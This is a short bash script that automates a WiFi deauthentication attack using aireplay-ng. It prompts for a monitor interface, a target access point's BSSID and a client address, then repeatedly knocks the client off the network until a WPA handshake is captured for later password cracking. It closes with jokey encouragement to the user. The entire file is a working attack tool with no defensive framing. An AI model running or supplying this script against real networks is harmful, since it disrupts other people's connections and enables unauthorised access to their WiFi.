#!/bin/bash

MONITOR=mon

echo "Preparing for the deauthentication attack ..."
sleep 2
read -p "MONITORING INTERFACE: " INTERFACE
read -p "BSSID: " BSSID
read -p "CLIENT: " CLIENT
aireplay-ng --deauth 1 -a $BSSID -c $CLIENT $INTERFACE$MONITOR

read -p "Have you gotten a handshake already?[y/n]: " HANDSHAKECONFIRM

while [ $HANDSHAKECONFIRM == "n" ]
do
  clear
  read -p "( ಥ ʖ̯ ಥ) Maybe a different client?[y/n]" CHANGECLIENT
  clear
  if [ $CHANGECLIENT == "y" ]; then
    read -p "NEW CLIENT: " CLIENT
  fi
  echo "Restarting deauth attack..."
  sleep 2
  aireplay-ng --deauth 1 -a $BSSID -c $CLIENT $INTERFACE$MONITOR
  read -p "How a about now? Have you gotten a handshake?[y/n]: " HANDSHAKECONFIRM
done
clear
echo "Go get 'em boi/gurl !!! (ง'̀-'́)ง"
sleep 5
exit


